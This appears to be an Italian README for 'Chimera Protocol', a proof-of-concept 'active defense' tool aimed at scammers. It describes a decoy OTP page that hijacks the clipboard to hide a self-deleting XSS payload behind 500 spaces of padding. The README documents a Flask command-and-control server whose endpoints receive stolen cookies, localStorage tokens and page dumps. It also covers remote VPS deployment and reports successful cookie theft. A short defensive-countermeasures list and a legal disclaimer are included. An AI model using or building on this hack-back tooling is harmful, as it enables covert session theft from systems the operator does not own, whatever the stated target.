# Chimera Protocol - Active Countermeasures PoC

**Project Chimera** è un Proof of Concept (PoC) di "Difesa Attiva" progettato per identificare e tracciare operatori fraudolenti (Scammers) che copiano dati non autorizzati dalle macchine delle vittime.

Sfrutta la fiducia implicita del sistema operativo e dei browser nel **Clipboard**, trasformando un'azione passiva (essere copiati) in un vettore di contro-attacco attivo.

---

## 🏗 Architettura

Il sistema è composto da tre componenti principali:

1.  **The Trap (`vittima.html`)**: La pagina esca. Sembra una normale pagina di autenticazione con un codice OTP. Contiene il motore di iniezione JavaScript che intercetta l'evento `copy` e genera dinamicamente il payload Iceberg.
2.  **The Payload (Iceberg v2)**: Un payload stealth iniettato nel clipboard, composto da `[Decoy] + [Padding] + [XSS]`, progettato per essere invisibile agli occhi umani ma eseguibile dai browser.
3.  **The C2 Server (`c2_server.py`)**: Un server Command & Control avanzato (Python/Flask) con supporto CORS, persistenza dati JSON, e endpoint multipli per exfiltration completa (Cookie, LocalStorage, User Agent, HTML dumps).

---

## ⚔️ Tecniche Stealth Implementate

### 1. TECNICA ICEBERG (Visual Cloaking)
Nasconde il codice malevolo `XSS` spingendolo fuori dall'area visibile dei campi di input.
- **Funzionamento**: Genera una stringa composta da `[Esca] + [500 Spazi] + [Payload]`.
- **Effetto**: Quando lo scammer incolla nel suo CRM, vede solo l'esca (es. "123456"). Il codice malevolo è "sommerso" a destra, invisibile senza uno scroll intenzionale.

### 2. PAYLOAD ADATTIVO (Dynamic Generation)
Il payload viene generato dinamicamente dalla funzione `getIcebergPayload()` che:
- **Decoy Intelligente**: Usa il testo originale copiato come esca (es. "123456" o nome vittima)
- **Padding Configurabile**: 500 spazi invisibili che nascondono il payload
- **XSS Stealth**: Tag `<img>` con `onerror` handler che esfiltra dati e si autodistrugge
- **Configurazione Centralizzata**: Variabile `C2_URL` modificabile per ambienti diversi

---

## 🚀 Istruzioni per l'Uso (Laboratorio Locale)

### Prerequisiti
- Python 3 installato.
- Libreria Flask (`pip install flask`).

### 1. Avviare il Command & Control
Apri un terminale nella cartella del progetto ed esegui:
```bash
python c2_server.py
```
*Il server ascolterà su `http://127.0.0.1:5000` e creerà automaticamente la directory `loot_dumps/` per salvare i dati esfiltrati.*

**Output atteso:**
```
[*] C2 Vacuum Server running on port 5000...
```

### 2. Preparare la Trappola
Apri il file `vittima.html` nel tuo browser. Questa sarà la pagina "vittima".

### 3. Simulare l'Attacco (XSS Web)
1. Apri `crm_scammer_simulato.html` in un'altra scheda o finestra.
2. Vai su `vittima.html`, seleziona il codice **123456** e copialo (`CTRL+C`).
3. **Verifica nella Console** (F12): Dovresti vedere:
   ```
   [PASSIVE INTEL] Lo scammer sta copiando: "123456"
   [ACTIVE DEFENSE] Intercettazione copia. Iniezione Iceberg avviata.
   ```
4. Vai su `crm_scammer_simulato.html` e incolla (`CTRL+V`) nel campo "Nome Vittima".
5. **Osserva**: Vedrai solo "123456" (Iceberg Effect - il payload è nascosto a destra).
6. Clicca **"SALVA NEL DB"**.
7. **Controlla il Terminale del C2**: Vedrai un log dettagliato:
   ```
   [!!!] LOOT RECEIVED (Legacy GET) AT 2025-12-30 14:51:20 [!!!]
   Source IP: 127.0.0.1
   Location: file:///C:/Users/.../crm_scammer_simulato.html
   Cookies : session_id=admin_secret_123
   ```
8. **Controlla il Browser**: Il payload si sarà auto-rimosso dal DOM (`this.remove()`), lasciando zero tracce visibili.

### 4. Simulare l'Attacco (Excel - Safe Fail)
1. Copia il codice da `vittima.html`.
2. Incolla in una cella di Excel.
3. **Risultato**: Excel (nelle versioni moderne protette) incollerà i numeri "123456" prendendo il testo semplice o l'HTML pulito, evitando l'esecuzione della formula. Questo è un comportamento "Safe Fail": l'attacco non parte, ma non veniamo scoperti.

---

## 🔌 Endpoint del C2 Server

Il server `c2_server.py` espone i seguenti endpoint:

### 1. `/exfil` (GET) - Legacy Exfiltration
Riceve dati esfiltrati dal payload Iceberg via query parameters.

**Parametri:**
- `c`: Cookie (base64 encoded)
- `l`: Location/URL (base64 encoded)

**Esempio:**
```
GET /exfil?c=c2Vzc2lvbl9pZD1hZG1pbl9zZWNyZXRfMTIz&l=ZmlsZTovLy9DL1VzZXJzLy4uLg==
```

**Output Console:**
```
[!!!] LOOT RECEIVED (Legacy GET) AT 2025-12-30 14:51:20 [!!!]
Source IP: 127.0.0.1
Location: file:///C:/Users/.../crm_scammer_simulato.html
Cookies : session_id=admin_secret_123
```

### 2. `/vacuum` (POST) - Advanced Data Exfiltration
Endpoint avanzato per ricevere payload JSON completi con dati massivi.

**Payload JSON:**
```json
{
  "u": "https://crm.example.com/dashboard",
  "c": "session_id=xyz; auth_token=abc",
  "ua": "Mozilla/5.0...",
  "ls": "{\"jwt\":\"eyJhbGc...\"}",
  "html": "<html>...</html>"
}
```

**Campi:**
- `u`: URL del CRM/sistema compromesso
- `c`: Cookie completi
- `ua`: User Agent del browser
- `ls`: LocalStorage (può contenere JWT tokens!)
- `html`: Dump completo HTML della pagina

**Dati Salvati:**
Crea file in `loot_dumps/loot_YYYYMMDD-HHMMSS_IP.json` con tutto il payload.

### 3. `/track` (GET) - Excel/CSV Trigger
Traccia quando un file Excel/CSV contenente formule viene aperto.

**Parametri:**
- `src`: Sorgente del trigger (es. "xls", "csv")

### 4. `/ping` (GET) - Health Check
Test di connettività del server C2.

**Risposta:** `pong`

---

## 📂 Struttura dei File Salvati

Quando il C2 riceve dati via `/vacuum`, salva tutto in:

```
loot_dumps/
├── loot_20251230-145120_127.0.0.1.json
├── loot_20251230-150345_192.168.1.100.json
└── ...
```

**Formato JSON:**
```json
{
    "u": "https://crm-scammer.example.com/admin",
    "c": "session_id=admin_secret_123; PHPSESSID=abc...",
    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "ls": "{\"auth_token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\"}",
    "html": "<!DOCTYPE html><html>...</html>"
}
```

Questi file possono essere analizzati per:
- **Forensics**: Timestamping degli attacchi
- **Intelligence**: Identificazione infrastruttura scammer
- **Evidence**: Prove per segnalazioni legali

---

## ⚙️ Configurazione Avanzata

### Cambiare l'URL del C2
Modifica la variabile in `vittima.html`:
```javascript
const C2_URL = "http://127.0.0.1:5000"; // Locale
// const C2_URL = "https://your-server.com"; // Remoto
```

### Deploy del C2 su Server Remoto
Per usare Chimera in ambienti non-locali:

1. Deploy `c2_server.py` su un VPS (es. DigitalOcean, AWS)
2. Configura firewall per porta 5000
3. (Opzionale) Aggiungi HTTPS con reverse proxy nginx
4. Aggiorna `C2_URL` in `vittima.html`

**IMPORTANTE:** Usa solo su server autorizzati e per scopi legali.

### Disabilitare Active Defense
Per mostrare solo log passivo senza attacco:
```javascript
const ATTACK_SWITCH = false; // Disabilita iniezione
```

---

## 📊 Risultati dei Test

### ✅ Test di Successo

| Vettore | Target | Risultato | Note |
|---------|--------|-----------|------|
| **Iceberg XSS** | CRM Web Simulato | ✅ **SUCCESSO** | Stealth massimo, exfiltration completa, self-destruction confermata |
| **Iceberg XSS** | Google Sheets | ⚠️ **BLOCCATO** | Google blocca URL localhost, funzionerebbe con C2 pubblico |
| **Iceberg XSS** | Excel Moderno | ❌ **SAFE FAIL** | Excel ignora payload (non inizia con `=`), ma nessun alert |
| **Clipboard Hijack** | Tutti i Browser | ✅ **SUCCESSO** | Copy event interceptato correttamente |
| **C2 Exfiltration** | Flask Server | ✅ **SUCCESSO** | Dati ricevuti e salvati in JSON |

### 🎯 Efficacia per Target

**Target Primario - CRM Web (95% Efficacia):**
- ✅ Payload invisibile nel campo input
- ✅ XSS execution silenziosa
- ✅ Cookie rubati con successo
- ✅ Tracce cancellate automaticamente

**Target Secondario - Excel (5% Efficacia):**
- ❌ Versioni moderne hanno protezioni avanzate
- ✅ Non viene rilevato come minaccia (safe fail)
- ⚠️ Possibile funzionamento su Excel legacy non patchato

---

## 🔬 Note Tecniche

### Trade-off Strategici

**Iceberg vs Chimera Polyglot:**

| Caratteristica | Iceberg (v2) | Chimera Polyglot (v1) |
|----------------|--------------|------------------------|
| Stealth Visivo | ⭐⭐⭐⭐⭐ | ⭐⭐ |
| Compatibilità Excel | ⭐ | ⭐⭐⭐⭐ |
| Efficacia CRM Web | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| Social Engineering | ⭐⭐⭐⭐⭐ | ⭐⭐ |

**Decisione Implementativa:** Iceberg è stato scelto per massimizzare lo stealth contro il target primario (CRM web dei call center), sacrificando la compatibilità Excel che risulta marginale negli scenari reali.

### Limitazioni Conosciute

1. **CORS Restrictions**: Alcuni browser moderni potrebbero bloccare fetch cross-origin senza HTTPS
2. **CSP Headers**: CRM con Content Security Policy strict bloccano inline scripts
3. **Input Sanitization**: CRM che usano DOMPurify o simili neutralizzano l'XSS
4. **Google Sheets**: Blocca URL localhost/IP privati nelle formule

### Contromisure Possibili (Per Difendersi)

Se sei un amministratore di sistema e vuoi proteggerti da questa tecnica:

1. **Sanitizza sempre l'input**: Usa `textContent` invece di `innerHTML`
2. **Implementa CSP**: `Content-Security-Policy: default-src 'self'`
3. **Monitora clipboard**: Controlla lunghezza anomala dei dati incollati
4. **Input validation**: Limita lunghezza massima e caratteri speciali
5. **User awareness**: Forma gli operatori a riconoscere comportamenti sospetti

---

## 📚 Casi d'Uso Legittimi

Questo PoC può essere utilizzato legalmente in:

1. **Honeypot per Call Center**: Identificare operatori interni che rubano dati clienti
2. **Red Team Engagements**: Testare la sicurezza di CRM aziendali (con autorizzazione)
3. **CTF/Bug Bounty**: Competizioni di sicurezza informatica
4. **Security Research**: Studio di tecniche di active defense
5. **Training**: Formazione su social engineering e clipboard attacks

---

## ⚠️ Disclaimer

Questo software è stato sviluppato a scopo puramente educativo e di ricerca per lo studio di contromisure difensive (Active Defense).

**IMPORTANTE:**
- ❌ L'uso contro sistemi non autorizzati è **ILLEGALE**
- ✅ Utilizzare solo in ambienti controllati di tua proprietà
- ✅ Richiedere autorizzazione scritta per penetration testing
- ❌ Non distribuire a terzi senza questo disclaimer

L'autore non si assume responsabilità per usi impropri del software.
